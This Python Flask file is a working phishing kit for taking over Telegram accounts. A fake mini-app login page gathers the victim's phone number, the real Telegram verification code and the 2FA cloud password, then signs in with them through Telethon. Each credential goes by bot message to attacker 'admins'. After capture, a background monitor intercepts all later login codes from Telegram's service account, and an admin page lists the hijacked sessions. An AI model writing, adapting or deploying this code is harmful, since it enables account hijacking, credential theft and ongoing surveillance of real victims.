from flask import Flask, request, render_template, redirect, url_for, session
import logging
import requests
import asyncio
import os
import threading
import re
from datetime import datetime
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError

from config import API_ID, API_HASH, BOTS, get_bot_by_id, get_admin_id

load_dotenv()

app = Flask(__name__)
app.secret_key = os.urandom(24)
logging.basicConfig(level=logging.DEBUG)

# Store session data and active clients
sessions = {}
active_clients = {}

def send_telegram_message(text, bot_id=None, admin_id=None):
    """Send message to admin via specific bot"""
    
    # If admin_id provided directly, use it
    if admin_id:
        # Find any bot to send with
        if BOTS:
            bot = list(BOTS.values())[0]
            token = bot['token']
        else:
            logging.error("No bots configured")
            return None
    elif bot_id:
        bot = get_bot_by_id(bot_id)
        if not bot:
            logging.error(f"Bot {bot_id} not found")
            return None
        token = bot['token']
        admin_id = bot['admin_id']
    else:
        # Send to all admins via their respective bots
        results = []
        for bid, bot in BOTS.items():
            result = send_telegram_message(text, bot_id=bid)
            results.append(result)
        return results
    
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": admin_id,
            "text": text,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        logging.error(f"Failed to send Telegram message: {e}")
        return None

def send_to_all_admins(text):
    """Send message to ALL configured admins"""
    for bot_id, bot in BOTS.items():
        send_telegram_message(text, bot_id=bot_id)

def run_async(coro):
    """Run async function in sync context"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

async def start_session_monitor(phone, client, bot_id=None):
    """Start monitoring a logged-in session for new login codes"""
    
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        message_text = event.message.text
        
        code_match = re.search(r'(\d{5,6})', message_text)
        code = code_match.group(1) if code_match else "N/A"
        
        print(f"\n{'='*60}")
        print(f"🚨 INTERCEPTED MESSAGE FROM TELEGRAM")
        print(f"📞 Account: {phone}")
        print(f"🔑 Code: {code}")
        print(f"{'='*60}\n")
        
        msg = f"""🚨 <b>INTERCEPTED LOGIN CODE!</b>

📞 <b>Account:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💬 <b>Full Message:</b>
<pre>{message_text[:500]}</pre>"""
        
        # Send to specific bot's admin or all admins
        if bot_id:
            send_telegram_message(msg, bot_id=bot_id)
        else:
            send_to_all_admins(msg)
    
    print(f"[MONITOR] Started monitoring session for {phone}")
    
    msg = f"""👁️ <b>SESSION MONITOR ACTIVE</b>

📞 <b>Account:</b> <code>{phone}</code>
✅ Now intercepting all login codes sent to this account."""
    
    if bot_id:
        send_telegram_message(msg, bot_id=bot_id)
    else:
        send_to_all_admins(msg)

def run_client_forever(phone, session_file, bot_id=None):
    """Run client in background thread"""
    async def _run():
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            print(f"[MONITOR] Session expired for {phone}")
            return
        
        active_clients[phone] = client
        await start_session_monitor(phone, client, bot_id)
        await client.run_until_disconnected()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(_run())

def start_monitoring_thread(phone, session_file, bot_id=None):
    """Start background thread for session monitoring"""
    thread = threading.Thread(
        target=run_client_forever, 
        args=(phone, session_file, bot_id), 
        daemon=True
    )
    thread.start()
    return thread

async def send_code_async(phone):
    """Send verification code to phone"""
    session_file = f"sessions/{phone.replace('+', '').replace(' ', '')}"
    os.makedirs("sessions", exist_ok=True)
    
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    try:
        result = await client.send_code_request(phone)
        sessions[phone] = {
            'phone_code_hash': result.phone_code_hash,
            'session_file': session_file
        }
        await client.disconnect()
        return {'success': True, 'phone_code_hash': result.phone_code_hash}
    except FloodWaitError as e:
        await client.disconnect()
        return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
    except Exception as e:
        await client.disconnect()
        return {'success': False, 'error': str(e)}

async def verify_code_async(phone, code, bot_id=None):
    """Verify the code entered by user"""
    if phone not in sessions:
        return {'success': False, 'error': 'Session expired', 'needs_2fa': False}
    
    session_data = sessions[phone]
    session_file = session_data['session_file']
    phone_code_hash = session_data['phone_code_hash']
    
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        
        me = await client.get_me()
        
        sessions[phone]['logged_in'] = True
        sessions[phone]['user_id'] = me.id
        sessions[phone]['username'] = me.username
        sessions[phone]['first_name'] = me.first_name
        sessions[phone]['bot_id'] = bot_id
        
        await client.disconnect()
        start_monitoring_thread(phone, session_file, bot_id)
        
        return {'success': True, 'needs_2fa': False, 'user': me}
        
    except SessionPasswordNeededError:
        await client.disconnect()
        sessions[phone]['needs_2fa'] = True
        return {'success': False, 'needs_2fa': True, 'error': '2FA required'}
        
    except PhoneCodeInvalidError:
        await client.disconnect()
        return {'success': False, 'needs_2fa': False, 'error': 'Invalid code'}
        
    except PhoneCodeExpiredError:
        await client.disconnect()
        return {'success': False, 'needs_2fa': False, 'error': 'Code expired'}
        
    except Exception as e:
        await client.disconnect()
        return {'success': False, 'needs_2fa': False, 'error': str(e)}

async def verify_2fa_async(phone, password, bot_id=None):
    """Verify 2FA password"""
    if phone not in sessions:
        return {'success': False, 'error': 'Session expired'}
    
    session_data = sessions[phone]
    session_file = session_data['session_file']
    
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.sign_in(password=password)
        
        me = await client.get_me()
        
        sessions[phone]['logged_in'] = True
        sessions[phone]['user_id'] = me.id
        sessions[phone]['username'] = me.username
        sessions[phone]['first_name'] = me.first_name
        sessions[phone]['password'] = password
        sessions[phone]['bot_id'] = bot_id
        
        await client.disconnect()
        start_monitoring_thread(phone, session_file, bot_id)
        
        return {'success': True, 'user': me}
        
    except Exception as e:
        await client.disconnect()
        return {'success': False, 'error': str(e)}

# ==================== ROUTES ====================

@app.route('/')
def index():
    return redirect(url_for('miniapp'))

@app.route('/miniapp', methods=['GET'])
def miniapp():
    # Get bot_id from URL parameter
    bot_id = request.args.get('bot_id', '')
    session['bot_id'] = bot_id
    
    bot = get_bot_by_id(bot_id)
    bot_name = bot['name'] if bot else 'Telegram'
    
    return render_template('miniapp.html', bot_name=bot_name)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone', '').strip()
    bot_id = session.get('bot_id', '')
    
    if not phone:
        return render_template('miniapp.html', error='Please enter a phone number')
    
    if not phone.startswith('+'):
        phone = '+' + phone
    
    phone = re.sub(r'[^\d+]', '', phone)
    
    # Get bot info for notification
    bot = get_bot_by_id(bot_id)
    bot_name = bot['name'] if bot else 'Unknown'
    
    print(f"\n{'='*60}")
    print(f"📱 NEW LOGIN: {phone} via Bot: {bot_name}")
    print(f"{'='*60}\n")
    
    send_telegram_message(f"""🚨 <b>NEW LOGIN ATTEMPT</b>

📞 <b>Phone:</b> <code>{phone}</code>
🤖 <b>Via Bot:</b> {bot_name}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⏳ Sending verification code...""", bot_id=bot_id)
    
    result = run_async(send_code_async(phone))
    
    if result['success']:
        send_telegram_message(f"""✅ <b>CODE SENT</b>

📞 <b>Phone:</b> <code>{phone}</code>
📨 Real Telegram code sent to user's device.

⏳ Waiting for user to enter the code...""", bot_id=bot_id)
        
        session['phone'] = phone
        return redirect(url_for('verify_otp_page'))
    else:
        error_msg = result.get('error', 'Unknown error')
        send_telegram_message(f"""❌ <b>FAILED TO SEND CODE</b>

📞 <b>Phone:</b> <code>{phone}</code>
⚠️ <b>Error:</b> {error_msg}""", bot_id=bot_id)
        
        return render_template('miniapp.html', error=error_msg)

@app.route('/verify_otp', methods=['GET', 'POST'])
def verify_otp_page():
    phone = session.get('phone', '')
    bot_id = session.get('bot_id', '')
    
    if not phone:
        return redirect(url_for('miniapp'))
    
    if request.method == 'GET':
        return render_template('verify_otp.html', phone=phone)
    
    code = request.form.get('otp', '').strip()
    
    print(f"\n{'='*60}")
    print(f"🔐 OTP ENTERED: {code} for {phone}")
    print(f"{'='*60}\n")
    
    send_telegram_message(f"""🔐 <b>OTP ENTERED</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>

⏳ Verifying with Telegram...""", bot_id=bot_id)
    
    result = run_async(verify_code_async(phone, code, bot_id))
    
    if result['success']:
        user = result.get('user')
        send_telegram_message(f"""✅ <b>LOGIN SUCCESSFUL!</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>
👤 <b>Name:</b> {user.first_name if user else 'N/A'}
🆔 <b>Username:</b> @{user.username if user and user.username else 'N/A'}
🔢 <b>User ID:</b> <code>{user.id if user else 'N/A'}</code>

🎉 Session captured and monitoring started!""", bot_id=bot_id)
        
        return redirect(url_for('success'))
        
    elif result.get('needs_2fa'):
        send_telegram_message(f"""🔒 <b>2FA REQUIRED</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>

⏳ Waiting for cloud password...""", bot_id=bot_id)
        
        return redirect(url_for('verify_2fa_page'))
    else:
        error_msg = result.get('error', 'Invalid code')
        send_telegram_message(f"""❌ <b>INVALID CODE</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>
⚠️ <b>Error:</b> {error_msg}""", bot_id=bot_id)
        
        return render_template('verify_otp.html', phone=phone, error=error_msg)

@app.route('/verify_2fa', methods=['GET', 'POST'])
def verify_2fa_page():
    phone = session.get('phone', '')
    bot_id = session.get('bot_id', '')
    
    if not phone:
        return redirect(url_for('miniapp'))
    
    if request.method == 'GET':
        return render_template('verify_2fa.html', phone=phone)
    
    password = request.form.get('code', '').strip()
    
    print(f"\n{'='*60}")
    print(f"🔒 2FA PASSWORD: {password} for {phone}")
    print(f"{'='*60}\n")
    
    send_telegram_message(f"""🔒 <b>2FA PASSWORD ENTERED</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔐 <b>Password:</b> <code>{password}</code>

⏳ Verifying...""", bot_id=bot_id)
    
    result = run_async(verify_2fa_async(phone, password, bot_id))
    
    if result['success']:
        user = result.get('user')
        
        send_telegram_message(f"""✅ <b>FULL ACCESS OBTAINED!</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔐 <b>2FA Password:</b> <code>{password}</code>
👤 <b>Name:</b> {user.first_name if user else 'N/A'}
🆔 <b>Username:</b> @{user.username if user and user.username else 'N/A'}
🔢 <b>User ID:</b> <code>{user.id if user else 'N/A'}</code>

🎉 Session captured and monitoring started!""", bot_id=bot_id)
        
        return redirect(url_for('success'))
    else:
        error_msg = result.get('error', 'Invalid password')
        send_telegram_message(f"""❌ <b>2FA FAILED</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔐 <b>Password:</b> <code>{password}</code>
⚠️ <b>Error:</b> {error_msg}""", bot_id=bot_id)
        
        return render_template('verify_2fa.html', phone=phone, error=error_msg)

@app.route('/success')
def success():
    phone = session.get('phone', '')
    session.clear()
    return render_template('success.html', phone=phone)

@app.route('/failure')
def failure():
    phone = session.get('phone', '')
    return render_template('failure.html', phone=phone)

# ==================== ADMIN ROUTES ====================

@app.route('/admin')
def admin_dashboard():
    """Admin dashboard"""
    return render_template('admin.html', 
                         sessions=sessions, 
                         active_clients=active_clients,
                         bots=BOTS)

@app.route('/admin/sessions')
def admin_sessions():
    """View all captured sessions as JSON"""
    return {
        'sessions': {k: {**v, 'active': k in active_clients} for k, v in sessions.items()},
        'total': len(sessions),
        'active_monitors': len(active_clients)
    }

@app.route('/admin/bots')
def admin_bots():
    """View all configured bots"""
    return {'bots': BOTS}

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🚀 Flask app starting on http://127.0.0.1:5000")
    print("📡 Make sure ngrok is running: ngrok http 5000")
    print(f"🤖 Configured bots: {len(BOTS)}")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
